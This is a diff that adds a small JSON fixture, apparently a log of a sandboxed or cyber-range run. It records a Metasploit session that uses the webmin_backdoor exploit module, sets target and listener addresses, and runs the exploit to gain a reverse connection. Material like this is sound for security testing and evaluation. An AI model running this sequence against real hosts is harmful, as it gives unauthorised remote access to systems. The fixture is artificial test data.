@@ -1,0 +1,32 @@
+[
+  {
+    "sandbox_id": "crcz-native-bminus",
+    "timestamp_str": "2026-01-01T10:00:01",
+    "cmd_type": "bash-command",
+    "cmd": "msfconsole"
+  },
+  {
+    "sandbox_id": "crcz-native-bminus",
+    "timestamp_str": "2026-01-01T10:00:02",
+    "cmd_type": "msf-command",
+    "cmd": "use exploit/linux/http/webmin_backdoor"
+  },
+  {
+    "sandbox_id": "crcz-native-bminus",
+    "timestamp_str": "2026-01-01T10:00:03",
+    "cmd_type": "msf-command",
+    "cmd": "set RHOST 172.18.1.5"
+  },
+  {
+    "sandbox_id": "crcz-native-bminus",
+    "timestamp_str": "2026-01-01T10:00:04",
+    "cmd_type": "msf-command",
+    "cmd": "set LHOST 10.10.135.83"
+  },
+  {
+    "sandbox_id": "crcz-native-bminus",
+    "timestamp_str": "2026-01-01T10:00:05",
+    "cmd_type": "msf-command",
+    "cmd": "exploit"
+  }
+]
